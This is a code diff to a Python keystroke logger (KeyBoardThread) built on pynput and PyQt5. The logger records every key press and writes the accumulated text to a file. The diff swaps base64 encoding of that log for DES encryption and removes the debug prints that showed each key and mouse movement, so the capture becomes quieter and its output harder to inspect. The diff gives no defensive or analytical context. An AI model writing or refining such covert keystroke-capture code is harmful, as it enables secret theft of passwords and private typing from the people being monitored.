@@ -1,8 +1,9 @@
-import time, os, base64
+import time, os
 from PyQt5.QtCore import QThread
 from pynput import keyboard, mouse
 
 from ..utils import path
+from .. import desCrypt
 
 class KeyBoardThread(QThread):
     enterFlag = False
@@ -17,10 +18,10 @@ class KeyBoardThread(QThread):
                 content = ""
                 if os.path.exists(path.path(self.fileName)):
                     with open(path.path(self.fileName), "r", encoding="utf-8") as f1:
-                        content += base64.b64decode(f1.read()).decode("utf-8")
+                        content += desCrypt.decrypt(f1.read())
                 content += self.logContent
                 with open(path.path(self.fileName), "w", encoding="utf-8") as f2:
-                    f2.write(base64.b64encode(bytes(content, "utf-8")).decode("utf-8"))
+                    f2.write(desCrypt.encrypt(content))
                 self.logContent = ""
             except Exception as e:
                 print(e)
@@ -34,16 +35,13 @@ class KeyBoardThread(QThread):
         try:
             char = key.char
             if char:
-                print(f"{char} Pressed.")
                 self.logContent += char
         except AttributeError:
-            print(f"{key} Pressed.")
             self.logContent += f"[{str(key).replace('Key.', '')}]"
         if not self.enterFlag:
             self.enterFlag = True
     
     def on_mouse(self, x, y, dx=None, dy=None):
-        print("Mouse move", x, y, dx, dy)
         if self.enterFlag:
             self.logContent += "\n"
             self.enterFlag = False
